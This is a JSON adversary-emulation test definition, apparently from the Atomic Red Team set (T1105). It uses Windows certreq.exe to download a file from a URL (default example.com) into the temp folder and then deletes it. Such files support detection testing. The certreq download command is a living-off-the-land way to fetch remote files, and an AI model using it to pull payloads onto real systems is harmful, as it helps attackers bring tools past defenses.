{
  "id": "6fdaae87-c05b-42f8-842e-991a74e8376b",
  "name": "certreq download",
  "description": "Use certreq to download a file from the web",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "7e806cce-1e24-4755-94ca-0f4fc0419e9f",
      "type": "execute-command",
      "data": {
        "command": "certreq.exe -Post -config #{remote_file} c:\\windows\\win.ini #{local_path}",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "eb9d8d52-dde0-48e0-90c5-601e2d4d1a6a",
      "type": "execute-command",
      "data": {
        "command": "del #{local_path} \u003enul 2\u003e\u00261",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "7e806cce-1e24-4755-94ca-0f4fc0419e9f",
      "p": "on-success",
      "o": "eb9d8d52-dde0-48e0-90c5-601e2d4d1a6a"
    },
    {
      "s": "7e806cce-1e24-4755-94ca-0f4fc0419e9f",
      "p": "on-failure",
      "o": "eb9d8d52-dde0-48e0-90c5-601e2d4d1a6a"
    }
  ],
  "tags": [
    "T1105",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "local_path",
      "type": "string",
      "description": "Local path to place file",
      "value": "%temp%\\Atomic-license.txt"
    },
    {
      "name": "remote_file",
      "type": "url",
      "description": "URL of file to copy",
      "value": "https://example.com"
    }
  ]
}